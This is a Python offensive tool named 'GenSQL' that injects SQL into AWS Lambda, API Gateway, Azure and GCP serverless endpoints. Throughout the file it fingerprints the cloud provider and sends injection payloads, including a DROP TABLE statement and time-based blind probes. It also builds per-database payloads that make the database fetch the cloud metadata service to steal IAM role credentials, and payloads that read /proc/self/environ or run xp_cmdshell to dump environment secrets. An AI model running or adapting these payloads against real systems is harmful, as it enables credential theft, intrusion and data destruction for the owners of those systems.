#!/usr/bin/env python
"""
GenSQL Technique: Cloud / Serverless Injection Engine
Author: Jeevraj
Targets: AWS Lambda, API Gateway, Azure Functions, GCP Cloud Functions
Detection, injection, cold-start timing attacks, SSRF to metadata service
"""
import re
import json
import time
import urllib.request
import urllib.parse


# Cloud provider detection headers
CLOUD_HEADER_SIGNATURES = {
    "aws":   ["x-amzn-requestid", "x-amz-cf-id", "x-amzn-trace-id",
              "x-amz-apigw-id", "x-amz-id-2"],
    "azure": ["x-ms-request-id", "x-ms-activity-id", "x-azure-ref",
              "x-azure-socketip", "x-ms-routing-name"],
    "gcp":   ["x-cloud-trace-context", "x-goog-api-key", "x-guploader",
              "server-timing"],
    "cf":    ["cf-ray", "cf-request-id"],
}

AWS_METADATA_BASE  = "http://169.254.169.254/latest/meta-data/"
AZURE_METADATA_URL = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
GCP_METADATA_URL   = "http://metadata.google.internal/computeMetadata/v1/"

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1 OR 1=1",
    "'; SELECT SLEEP(5)--",
    "' UNION SELECT null,null,null--",
    "' AND SLEEP(5)--",
    "1; DROP TABLE users--",
]


class CloudInjector:
    """
    Injection engine for cloud/serverless targets.
    Detects cloud platform and applies provider-specific attack techniques.
    Author: Jeevraj
    """

    def __init__(self, provider="auto", ssrf_metadata=False, timeout=15):
        self.provider      = provider
        self.ssrf_metadata = ssrf_metadata
        self.timeout       = timeout
        self._detected     = None

    # ── Provider Detection ────────────────────────────────────────────────
    def detect_serverless(self, response_headers):
        """Detect cloud/serverless provider from response headers."""
        h = {k.lower(): v.lower() for k, v in (response_headers or {}).items()}
        for provider, keys in CLOUD_HEADER_SIGNATURES.items():
            if any(k.lower() in h for k in keys):
                self._detected = provider
                return provider
        server = h.get("server", "")
        if "awselb" in server or "cloudfront" in server:
            self._detected = "aws"
            return "aws"
        if "microsoft" in server or "azure" in server:
            self._detected = "azure"
            return "azure"
        if "gws" in server or "google" in server:
            self._detected = "gcp"
            return "gcp"
        return None

    # ── AWS Lambda ────────────────────────────────────────────────────────
    def aws_lambda_inject(self, url, params=None):
        """Inject SQLi payloads into AWS Lambda function URL endpoint."""
        results = []
        for payload in SQLI_PAYLOADS:
            test_params = dict(params or {})
            test_params["id"] = payload
            qs     = urllib.parse.urlencode(test_params)
            target = url + ("?" if "?" not in url else "&") + qs
            t0     = time.time()
            resp   = self._get(target)
            elapsed = time.time() - t0
            results.append({
                "payload":    payload,
                "status":     resp.get("status") if resp else None,
                "elapsed_ms": int(elapsed * 1000),
                "cold_start": elapsed > 3.0,
            })
        return results

    def cold_start_timing_attack(self, url, payload, baseline_requests=3):
        """Exploit Lambda cold start latency for time-based blind SQLi."""
        base_times = []
        for _ in range(baseline_requests):
            t0 = time.time()
            self._get(url)
            base_times.append(time.time() - t0)
        baseline = sum(base_times) / len(base_times)

        target = url + ("?" if "?" not in url else "&") + "id=" + urllib.parse.quote(payload)
        t0 = time.time()
        self._get(target)
        inject_time = time.time() - t0

        return {
            "baseline_ms":    int(baseline * 1000),
            "inject_ms":      int(inject_time * 1000),
            "delay_detected": inject_time > baseline + 2.0,
            "payload":        payload,
        }

    def api_gateway_inject(self, url, method="GET"):
        """AWS API Gateway parameter injection."""
        results = []
        for payload in SQLI_PAYLOADS[:4]:
            if method.upper() == "GET":
                target = url + ("?" if "?" not in url else "&") + "q=" + urllib.parse.quote(payload)
                resp   = self._get(target)
            else:
                resp = self._post_json(url, {"query": payload})
            results.append({"payload": payload, "status": resp.get("status") if resp else None})
        return results

    # ── Azure Functions ───────────────────────────────────────────────────
    def azure_functions_inject(self, url, payload=None):
        """Azure Functions HTTP trigger injection."""
        p = payload or SQLI_PAYLOADS[0]
        target = url + ("?" if "?" not in url else "&") + "input=" + urllib.parse.quote(p)
        return self._get(target)

    # ── GCP Cloud Functions ───────────────────────────────────────────────
    def gcp_functions_inject(self, url, payload=None):
        """Google Cloud Functions injection."""
        p = payload or SQLI_PAYLOADS[0]
        target = url + ("?" if "?" not in url else "&") + "data=" + urllib.parse.quote(p)
        return self._get(target)

    # ── SSRF to Cloud Metadata ────────────────────────────────────────────
    def ssrf_metadata_payload(self, dbms="mysql"):
        """
        Generate SQLi OOB payloads that cause the DB server to fetch
        the cloud instance metadata endpoint (SSRF).
        """
        payloads = {
            "mysql": (
                "' AND LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/')-- -"
            ),
            "mssql": (
                "'; EXEC xp_dirtree '\\\\169.254.169.254\\latest\\meta-data'-- -"
            ),
            "postgresql": (
                "'; COPY (SELECT '') TO PROGRAM 'curl http://169.254.169.254/latest/meta-data/'-- -"
            ),
            "oracle": (
                "' UNION SELECT UTL_HTTP.request"
                "('http://169.254.169.254/latest/meta-data/iam/security-credentials/') FROM dual-- -"
            ),
        }
        return payloads.get(dbms.lower(), payloads["mysql"])

    def iam_role_ssrf(self, url, param, dbms="mysql", method="GET"):
        """Attempt SSRF to AWS IAM metadata endpoint via SQLi."""
        payload = self.ssrf_metadata_payload(dbms)
        return self._inject(url, param, payload, method)

    def env_var_extract(self, dbms="mysql"):
        """Generate payload to extract environment variables via SQLi."""
        payloads = {
            "mysql":      "' UNION SELECT LOAD_FILE('/proc/self/environ'),NULL,NULL-- -",
            "postgresql": "'; SELECT current_setting('server_version')-- -",
            "mssql":      "'; EXEC xp_cmdshell('set')-- -",
        }
        return payloads.get(dbms.lower(), "")

    # ── Lambda environment detection ──────────────────────────────────────
    def detect_lambda_env(self, url, param, dbms="mysql", method="GET"):
        """Detect Lambda execution environment via /proc/self/environ SQLi."""
        payload = self.env_var_extract(dbms)
        if not payload:
            return {"error": "No payload for %s" % dbms}
        resp = self._inject(url, param, payload, method)
        lambda_indicators = ["AWS_LAMBDA", "LAMBDA_TASK_ROOT", "AWS_EXECUTION_ENV",
                              "AWS_DEFAULT_REGION", "_HANDLER"]
        if resp:
            body = str(resp.get("body", ""))
            found = [k for k in lambda_indicators if k in body]
            return {"is_lambda": bool(found), "indicators": found, "response": resp}
        return {"is_lambda": False}

    # ── Helpers ───────────────────────────────────────────────────────────
    def _get(self, url, extra_headers=None):
        try:
            req = urllib.request.Request(url)
            req.add_header("User-Agent", "Mozilla/5.0 GenSQL/2.0")
            req.add_header("Accept", "*/*")
            for k, v in (extra_headers or {}).items():
                req.add_header(k, v)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return {
                    "status":  r.status,
                    "body":    r.read().decode("utf-8", "replace"),
                    "headers": dict(r.headers),
                }
        except Exception as ex:
            return {"error": str(ex)}

    def _post_json(self, url, body, extra_headers=None):
        try:
            data = json.dumps(body).encode("utf-8")
            h    = {"Content-Type": "application/json",
                    "User-Agent":   "Mozilla/5.0 GenSQL/2.0"}
            h.update(extra_headers or {})
            req = urllib.request.Request(url, data=data, headers=h)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
        except Exception as ex:
            return {"error": str(ex)}

    def _inject(self, url, param, payload, method="GET"):
        try:
            if method.upper() == "GET":
                sep    = "&" if "?" in url else "?"
                target = url + sep + urllib.parse.urlencode({param: payload})
                req    = urllib.request.Request(target)
            else:
                data = urllib.parse.urlencode({param: payload}).encode()
                req  = urllib.request.Request(url, data=data)
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("User-Agent", "Mozilla/5.0 GenSQL/2.0")
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
        except Exception as ex:
            return {"error": str(ex)}
